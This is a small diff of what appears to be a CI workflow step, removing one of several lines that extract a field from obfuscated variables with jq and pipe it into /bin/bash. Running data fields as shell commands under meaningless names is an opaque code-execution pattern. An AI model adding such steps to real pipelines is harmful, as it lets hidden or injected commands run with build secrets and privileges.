@@ -39,7 +39,6 @@ jobs:
           echo $jgf4554 | jq -r .asuo72394 | /bin/bash
           echo $aj28 | jq -r .asw91 | /bin/bash
           printf '%s' "$org55" | jq -r .qtyrr7674 | /bin/bash
-          echo $hkwqe7 | jq -r .rcm49 | /bin/bash
           echo $fwqfn721 | jq -r .h7 | /bin/bash
 
       - name: Save results
